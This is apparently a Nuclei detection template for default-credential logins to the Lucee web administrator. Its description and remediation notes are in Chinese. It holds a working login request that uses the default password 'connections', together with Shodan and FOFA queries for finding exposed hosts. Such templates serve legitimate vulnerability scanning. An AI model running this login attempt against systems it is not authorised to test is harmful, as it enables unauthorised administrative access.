id: lucee-default-login

info:
  name: Lucee 默认口令登录（弱口令）
  author: jpg0mez
  severity: high
  description: |
    该模板用于检测 Lucee 是否仍可使用默认凭据或弱口令登录。模板主要向 `{变量}` 等认证入口发送请求，使用内置默认凭据组合进行认证尝试，并根据状态码、认证 Cookie、跳转位置或登录后的页面关键字判断登录是否成功；命中说明目标未及时修改出厂、示例或初始化账号口令。
  impact: |
    - 攻击者可登录 Lucee 后台，管理内容、用户、插件、主题、文件、表单或业务流程配置。
    - 后台权限被滥用后，可能导致页面篡改、恶意文件上传、敏感资料泄露，或进一步取得服务器执行能力。
  remediation: |
    - 立即修改默认管理员凭据，删除安装向导、演示账号和不必要的后台用户。
    - 限制后台登录入口访问来源，启用多因素认证、登录失败锁定和验证码等防护。
    - 检查近期内容、插件、主题、文件上传和管理员操作记录，确认没有持久化后门。
  reference:
    - https://support.intranetconnections.com/hc/en-us/articles/115012060627-Lucee-Configuration
  classification:
    cwe-id: CWE-1392
  metadata:
    verified: true
    max-request: 1
    shodan-query: "html:\"Lucee\""
    fofa-query: "app=\"Lucee-Engine\""
  tags: lucee,default-login,vuln

http:
  - raw:
      - |
        POST {{path}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        login_passwordweb={{password}}&lang=en&rememberMe=s&submit=submit

    attack: pitchfork
    payloads:
      path:
        - /lucee/admin/web.cfm
        - /lucee/admin/server.cfm
      password:
        - "connections"

    stop-at-first-match: true
    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "Overview - Lucee Web Administrator")'
          - '!contains(body, "Access is protected")'
          - 'status_code == 200'
        condition: and
